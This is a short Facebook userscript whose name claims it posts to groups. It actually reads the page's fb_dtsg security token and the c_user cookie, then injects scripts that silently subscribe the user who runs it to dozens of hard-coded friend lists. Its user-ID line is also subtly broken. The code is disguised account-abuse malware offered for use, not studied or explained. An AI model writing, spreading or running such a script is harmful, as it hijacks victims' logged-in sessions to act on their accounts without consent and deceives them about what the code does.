// ==UserScript==
// @name    auto.post-n-groups-atonce
// @version  1
// ==/UserScript==






var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function sublist(uidss) {
    var a = document.createElement('script');
    a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
    document.body.appendChild(a)
}

sublist(450382948440738);
sublist(450380628440970);
sublist(450380101774356);
sublist(450382695107430);
sublist(450383178440715);
sublist(450382075107492);
sublist(450380491774317);
sublist(415146441964389);
sublist(427109174101449);
sublist(519909264787032);
sublist(427114434100923);
sublist(415148868630813);
sublist(6549472775164014);
sublist(324404561038578);
sublist(549472318497393);
sublist(6449354168543616);
sublist(450381925107507);
sublist(519907578120534);
sublist(450382251774141);
sublist(519908231453802);
sublist(549473255163966);
sublist(549473021830656);
sublist(549473701830588);
sublist(552686858175939);
sublist(549473601830598);
sublist(552687044842587);
sublist(552688704842421);
sublist(552687191509239);
sublist(552689108175714);
sublist(552688818175743);
sublist(552688964842395);
sublist(552687348175890);
sublist(450381705107529);
sublist(450383051774061);
sublist(450383348440698);
sublist(552687348175890);
sublist(552688964842395);
sublist(450382368440796);
sublist(450382545107445);

























